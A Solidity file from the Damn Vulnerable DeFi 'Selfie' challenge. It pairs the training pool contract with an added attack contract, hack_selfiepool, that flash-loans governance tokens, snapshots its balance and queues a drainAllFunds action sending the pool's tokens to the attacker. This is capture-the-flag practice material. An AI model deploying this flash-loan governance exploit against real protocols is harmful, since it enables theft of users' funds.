// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

/**
 * @title SelfiePool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfiePool is ReentrancyGuard {
    using Address for address;

    ERC20Snapshot public token;
    SimpleGovernance public governance;

    event FundsDrained(address indexed receiver, uint256 amount);

    modifier onlyGovernance() {
        require(
            msg.sender == address(governance),
            "Only governance can execute this action"
        );
        _;
    }

    constructor(address tokenAddress, address governanceAddress) {
        token = ERC20Snapshot(tokenAddress);
        governance = SimpleGovernance(governanceAddress);
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        uint256 balanceBefore = token.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token.transfer(msg.sender, borrowAmount);

        require(msg.sender.isContract(), "Sender must be a deployed contract");
        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveTokens(address,uint256)",
                address(token),
                borrowAmount
            )
        );

        uint256 balanceAfter = token.balanceOf(address(this));

        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }

    function drainAllFunds(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
}

contract hack_selfiepool {
    SelfiePool private pool;
    SimpleGovernance private governance;
    DamnValuableTokenSnapshot private token;
    uint256 constant amount = 1500000 ether;
    address private hacker;
    uint256 private actionID;

    constructor(
        address _pool,
        address _gov,
        address _token
    ) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_gov);
        token = DamnValuableTokenSnapshot(_token);
        hacker = msg.sender;
    }

    function attck() public {
        pool.flashLoan(amount);
        actionID = governance.queueAction(
            address(pool),
            abi.encodeWithSignature("drainAllFunds(address)", hacker),
            0
        );
    }

    function receiveTokens(address, uint256) public payable {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            hacker
        );
        // actionID = governance.queueAction(
        //     address(pool),
        //     abi.encodeWithSignature("drainAllFunds(address)", hacker),
        //     0
        // );
        token.transfer(address(pool), amount);
    }

    function excute() public {
        governance.executeAction(actionID);
    }

    // fallback() external payable {
    //     receiveTokens(address(pool), amount);
    // }

    // receive() external payable {
    //     receiveTokens(address(pool), amount);
    // }
}
